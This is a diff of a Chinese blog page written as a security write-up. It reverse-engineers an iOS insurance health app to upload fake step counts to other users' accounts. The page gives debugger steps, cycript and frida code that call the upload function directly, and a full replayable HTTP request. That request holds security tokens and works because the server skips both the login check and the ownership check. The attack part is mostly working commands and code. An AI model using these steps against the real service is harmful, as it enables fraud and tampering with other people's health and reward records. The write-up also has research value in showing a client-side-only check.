@@ -186,7 +186,7 @@
 
 <h4 id="方法一pc可为windows或macos">方法一(pc可为windows或macOS)</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>手机上运行目标app:PALxxx
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>手机上运行目标app:PALxxx
 ssh root@iphone
 Cluth -i
 Cluth -d target_app_index
@@ -214,24 +214,22 @@ ssh root@iphone
 debugserver *:2008 -a PALxxx
 
 ida设置远程gdb server(对应ios中的debugserver)调试,参数如下图
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/remote_gdb1.png" alt="远程gdb server设置" /></p>
 
 <p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/remote_gdb2.png" alt="远程gdb server设置" /></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>开始在ida中调试
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>开始在ida中调试
 在setIntegratedSteps函数上下断点
 运行
 命中断点后设置trace functions
 在手机上点击上传步数
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="方法二要求pc是macos">方法二(要求pc是macOS)</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>iphone连上macOS的usb
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iphone连上macOS的usb
 ida加载PALxxx
 在ida中选择remote ios debugger,并设置好symbols和iphone中的app可执行文件的路径
     symbols可在~/ Library / Developer / Xcode / iOS DeviceSupport / &lt;iOS version&gt; / Symbols或通过ios_deploy获得
@@ -245,8 +243,7 @@ vmmap target_app_pid
 运行
 命中断点后设置trace functions
 在手机上点击上传步数
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><em>注意</em>
 1.使用方法二时最好在<code class="highlighter-rouge">debugger|debugger options</code>中的如下窗口中的<code class="highlighter-rouge">launch debuger automaticly</code>选项钩上(默认是钩上的)</p>
@@ -273,7 +270,7 @@ vmmap target_app_pid
 
 <p>上面2种方法trace到关键函数如下:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>000611FC	__text:-[PARSPedometerInfo setIntegratedSteps:]+C	RET	-[PARSPedometerInfo setIntegratedSteps:] returned to -[PARSPedometerInfo setIntegratedSteps:]-[PARSHealthKitHandler parseStepCountStatistics:]+33C
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000611FC	__text:-[PARSPedometerInfo setIntegratedSteps:]+C	RET	-[PARSPedometerInfo setIntegratedSteps:] returned to -[PARSPedometerInfo setIntegratedSteps:]-[PARSHealthKitHandler parseStepCountStatistics:]+33C
 000611FC	__text:-[PARSHealthKitHandler parseStepCountStatistics:]+340	BL              _objc_release	-[PARSHealthKitHandler parseStepCountStatistics:] call -[PARSHealthKitHandler parseStepCountStatistics:]_objc_release
 000611FC	__text:-[PARSHealthKitHandler parseStepCountStatistics:]+348	BL              _objc_release	-[PARSHealthKitHandler parseStepCountStatistics:] call -[PARSHealthKitHandler parseStepCountStatistics:]_objc_release
 000611FC	__text:-[PARSHealthKitHandler parseStepCountStatistics:]+358	BL              _objc_msgSend	-[PARSHealthKitHandler parseStepCountStatistics:] call -[PARSHealthKitHandler parseStepCountStatistics:]_objc_msgSend
@@ -281,8 +278,7 @@ vmmap target_app_pid
 000611FC	__text:-[PARSHealthKitHandler parseStepCountStatistics:]+378	BL              _objc_msgSend	-[PARSHealthKitHandler parseStepCountStatistics:] call -[PARSHealthKitHandler parseStepCountStatistics:]_objc_msgSend
 000611FC	__text:-[PARSHealthKitHandler parseStepCountStatistics:]+380	BL              _objc_release	-[PARSHealthKitHandler parseStepCountStatistics:] call -[PARSHealthKitHandler parseStepCountStatistics:]_objc_release
 000611FC	__text:-[PARSHealthKitHandler parseStepCountStatistics:]+388	BL              _objc_release	-[PARSHealthKitHandler parseStepCountStatistics:] call -[PARSHealthKitHandler parseStepCountStatistics:]_objc_release
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>尝试用<a href="https://github.com/deresz/funcap">funcap</a>插件获得<code class="highlighter-rouge">parseStepCountStatistics</code>函数的参数及返回值,发现funcap不支持arm的64位的cpu,ios设备cpu类型在<a href="http://blakespot.com/ios_device_specifications_grid.html">这里</a>于是用theos来记录,发现theos没有成功记录到parseStepCountStatistics函数的运行函数及返回值,说明关键函数不是这个函数,也即ida没有成功记录到关键的上传步数的函数,目前不理解为什么ida的trace功能为什么没有记录到这个关键函数.现在只好通过flex_injected来通过UI来分析出关键函数</p>
 
@@ -296,7 +292,7 @@ vmmap target_app_pid
 
 <p>从ida中查看walkUploadBtnClick函数的具体实现,内容如下:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>void __cdecl -[PARSHealthPedmoterHomeViewController walkUploadBtnClick:](PARSHealthPedmoterHomeViewController *self, SEL a2, id a3)
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void __cdecl -[PARSHealthPedmoterHomeViewController walkUploadBtnClick:](PARSHealthPedmoterHomeViewController *self, SEL a2, id a3)
 {
   PARSHealthPedmoterHomeViewController *v3; // x28
   PARSActivityDetailModel *v4; // x0
@@ -422,12 +418,11 @@ vmmap target_app_pid
   objc_release(v20);
   objc_release(v8);
 }
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>发现关键函数是<code class="highlighter-rouge">-[PARSHealthPedmoterHomeViewController requestUploadWithSure:](v48, "requestUploadWithSure:", v46 | v47);</code>这里的<code class="highlighter-rouge">requestUploadWithSure</code>函数,在ida中查看如下:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>void __cdecl -[PARSHealthPedometer10thHomeViewController requestUploadWithSure:](PARSHealthPedometer10thHomeViewController *self, SEL a2, bool a3)
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void __cdecl -[PARSHealthPedometer10thHomeViewController requestUploadWithSure:](PARSHealthPedometer10thHomeViewController *self, SEL a2, bool a3)
 {
   bool v3; // w19
   PARSHealthPedometer10thHomeViewController *v4; // x20
@@ -560,12 +555,11 @@ vmmap target_app_pid
     objc_release(v42);
   }
 }
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>从这里看出这个函数的参数是传入0或1,也可发现这个函数的进一步调用的函数是<code class="highlighter-rouge">healthWalkUploadTodayPedometer</code>,但由于<code class="highlighter-rouge">healthWalkUploadTodayPedometer</code>函数的参数是一个内存地址,需要动态设置,而requestUploadWithSure函数的参数传入”1”即可,用requestUploadWithSure函数更方法用<a href="http://www.cycript.org/">cycript</a>测试,于是直接在cycript中测试requestUploadWithSure(1),验证是否是关键函数,操作如下:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>ssh root@iphone_ip
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh root@iphone_ip
 cycript -p PALxxx
 choose(PARSEPedometerInfo)
     cy# choose(PARSPedometerInfo)
@@ -583,12 +577,11 @@ tmp=[PARSHealthPedometer10thHomeViewController alloc]
     生成关键上传函数requestUploadWithSure所在类的一个对象
 [tmp requestUploadWithSure:1]
     执行上传步数函数,参数为1
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>执行完上面的函数后在app中成功弹窗,提示上传成功,说明这个函数是关键上传函数,尝试用这个函数给其他用户上传步数,操作如下</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>app用其他用户的帐号登录
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app用其他用户的帐号登录
 ssh root@iphone_ip
 cycript -p PALxxx
 choose(PARSEPedometerInfo)
@@ -601,12 +594,11 @@ tmp1=[PARSHealthPedometer10thHomeViewController alloc]
 [tmp1 requestUploadWithSure:1]
     执行上传步数函数,参数为1
     或者将上传的动作合成1步[[PARSHealthPedometer10thHomeViewController alloc] setIntegratedSteps:66666]
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>上面是使用cycript给其他用户上传步数,也可通过frida如下实现(执行代码前需要用其他用户的帐号登陆本机app)</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>import frida
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import frida
 import sys
 
 session = frida.get_usb_device().attach(1535)
@@ -648,12 +640,11 @@ def on_message(message, data):
 script.on('message', on_message)
 script.load()
 sys.stdin.read()
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>通过函数给其他用户上传步数时也上传成功了,而在app中给其他用户上传时会弹出无法给其他用户上传的对话框,说明这个对话框对应的校验只是客户端校验,直接调用上传函数可绕过.另外,也可通过直接发burpsuite拦截到的上传包来实现给其他用户上传步数,需要修改burpsuite上传包中的securitytoken和mobilephone参数,其中cookie可随便填写或不填(说明上传步数时未校验登录态),一个可用包如下:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>POST /elis_smp_eco_dmz/ecology/elis.eco.web.healthPedomeSTQ.visit HTTP/1.1
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /elis_smp_eco_dmz/ecology/elis.eco.web.healthPedomeSTQ.visit HTTP/1.1
 Host: elis-smp-eco.xxx.xxx.cn
 Content-Type: application/x-www-form-urlencoded
 Accept-Encoding: gzip, deflate
@@ -666,14 +657,13 @@ Content-Length: 1663
 X-Tingyun-Id: s8-utloiNb8;c=2;r=2140640508
 
 appId=10001&amp;appVersion=4.8.9&amp;bundleIdentifier=com.pingan.pars&amp;chS=PKXwVPYlgXk06HHPubC3akmiPpMgR6KsaQ%2Bt4M2jJjUc/s2OgG7aQTgPykBKi0EvAjCdb0t20uoASkeT97M21wbV56lWmnIvlrExdB2Jhfe7OXMJ0M77Whx0fAO8%2BOKi9NNTftTzTVijKT/kObVQUfqH1GQCob7KtrUN8nJxn/8%3D&amp;channelType=01&amp;cv=490&amp;deviceId=h902704274530537c4335a514f5821f5a&amp;deviceToken=98b769eac2c74c882f68f0754a73c0a7698e4f8ba9222e5c20454de3f220c517&amp;jsonFlag=Y&amp;mobilePhone=ybN4u%2BkrjDmVoc/Bbu4YF0su9H9yMUsd0fcp9TKX/hDH2UfvQNuYeqtF4pGxlYi5z/S3dHl1zrzlYTTXjdgAaesXvk1v0A4Eh0Y/yyngiIAAq/jC4s1zIxOrchddIIr7p3XJ1pzFyxtKZBvdvtiNHZMZStM86lg8oytIOyIWUn0%3D&amp;osType=01&amp;osVersion=8.1.1&amp;pedometerList=%5B%0A%20%20%7B%0A%20%20%20%20%22iWatch%22%20%3A%20%220%22%2C%0A%20%20%20%20%22iPhone%22%20%3A%20%220%22%2C%0A%20%20%20%20%22pedometerNum%22%20%3A%20%2218785%22%2C%0A%20%20%20%20%22BMP%22%20%3A%20%220%22%2C%0A%20%20%20%20%22pedometerDate%22%20%3A%20%222017-12-27%22%0A%20%20%7D%2C%0A%20%20%7B%0A%20%20%20%20%22iWatch%22%20%3A%20%220%22%2C%0A%20%20%20%20%22iPhone%22%20%3A%20%220%22%2C%0A%20%20%20%20%22pedometerNum%22%20%3A%20%2218785%22%2C%0A%20%20%20%20%22BMP%22%20%3A%20%220%22%2C%0A%20%20%20%20%22pedometerDate%22%20%3A%20%222017-11-06%22%0A%20%20%7D%0A%5D&amp;raiseFlag=Y&amp;securityToken=bfeUcy8KJ7WHcldHioMh0K%2Bg7JX%2BpRN%2BxhMrSvphjgqtwJwzeo2NunKswzCs4%2B9uPcLwR27WVlfVQ9b%2BWOd6/qeGtyWgUPVGUrNPq9QJY85kE8Y%2Ba6xbJsQSPrY0IiLDAkQe4bylB5DfvTmBLaaF/Q%3D%3D&amp;timeset=YXCZD7hNQ9JLA363HFt5Ip5v%2BhbUlBNqvJCz496nlYe8rt2Ykad9AKQPr1aP6YnXdIYxidOamBlTUqLBShKL9JZowpkmd6Rd1PQAFoDhrEAR8feIPSy/laVJOJ/HaOEZtCvzG2nkssSW3YervLbSd81pKiKWcxLA4wsLHPp%2Bm7g%3D&amp;token=2a2d999d889bdb302dd0c6087afe269b797f4fabf298404009545f8f19723fd4&amp;uid=836832654629371904
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="0x3-后记">0x3 后记</h3>
 
 <p>刚开始的操作尝试给其他用户上传步数时遇到一些问题,发现app没有生成PARSPedometerInfo对象(后来发现只要点击进入到上传步数页面后就会生成PARSPedometerInfo对象),详情及对应解决方法如下</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>成功时的PARSPedometerInfo对象:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>成功时的PARSPedometerInfo对象:
     cy# choose(PARSPedometerInfo)
     [#"PARSPedometerInfo&lt;0x12f22cd60&gt;: \n integration=1541 \n iPhone=1541 \n watch=0 \n heartRat=0\n at:2017-12-26 16:00:00 +0000",#"PARSPedometerInfo&lt;0x12f406c90&gt;: \n integration=1541 \n iPhone=1541 \n watch=0 \n heartRat=0\n at:2017-12-26 16:00:00 +0000"]
 
@@ -681,12 +671,11 @@ appId=10001&amp;appVersion=4.8.9&amp;bundleIdentifier=com.pingan.pars&amp;chS=PK
     由于app没有生成PARSPedometerInfo对象,需要手动生成
     tmp=[PARSPedometerInfo alloc]
         #"PARSPedometerInfo&lt;0x14893bad0&gt;: \n integration=0 \n iPhone=0 \n watch=0 \n heartRat=0\n at:(null)"
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>发现失败时手动生成的PARSPedometerInfo类的对象的”时间值”为(null),有可能就是这个部分为null导致上传失败,尝试通过手动设置一个时间到手动生成的PARSPedometerInfo类的对象中,在ida中查看有没有设置时间的函数,发现PARSPedometerInfo包括如下函数:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>-[PARSPedometerInfo init]	__text	000000010069C7AC	00000080	00000030	FFFFFFFFFFFFFFF8	R	.	.	.	B	T	.
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-[PARSPedometerInfo init]	__text	000000010069C7AC	00000080	00000030	FFFFFFFFFFFFFFF8	R	.	.	.	B	T	.
 -[PARSPedometerInfo description]	__text	000000010069C82C	000000CC	00000070	FFFFFFFFFFFFFFF8	R	.	.	.	B	T	.
 -[PARSPedometerInfo iPhoneSteps]	__text	000000010069C8F8	00000010			R	.	.	.	.	T	.
 -[PARSPedometerInfo setIPhoneSteps:]	__text	000000010069C908	00000010			R	.	.	.	.	T	.
@@ -706,12 +695,11 @@ appId=10001&amp;appVersion=4.8.9&amp;bundleIdentifier=com.pingan.pars&amp;chS=PK
 -[PARSPedometerInfo setSyncDate:]	__text	000000010069C9F0	00000014			R	.	.	.	.	T	.
 -[PARSPedometerInfo stepFrequency]	__text	000000010069CA04	00000010			R	.	.	.	.	T	.
 -[PARSPedometerInfo setStepFrequency:]	__text	000000010069CA14	00000010			R	.	.	.	.	T	.
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>猜测setStartDate函数是设置时间的函数,而startDate函数是获取setStartDate函数设置时间后的时间的函数,于是操作如下:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>用第1个成功上传步数的帐户登录app
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>用第1个成功上传步数的帐户登录app
 ssh root@iphone_ip
 cycript -p PALxxx
 choose(PARSPedometerInfo)
@@ -723,14 +711,12 @@ cy# [#0x146fe33e0 startDate]
 用第2个上传步数失败的帐户登录app
 cycript -p PALxxx
 ...
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>然后再尝试上传其他帐户的步数,操作如下:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>到这里发现用第2个帐户上传时其实是会生成PARSPedometerInfo对象的,于是没有再进行后续操作,通过burpsuite发包内容可以推测,上传步数时的时间值的确不能少,接下来的操作理应会成功
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>到这里发现用第2个帐户上传时其实是会生成PARSPedometerInfo对象的,于是没有再进行后续操作,通过burpsuite发包内容可以推测,上传步数时的时间值的确不能少,接下来的操作理应会成功
+</code></pre></div></div>
 
 </span>
 
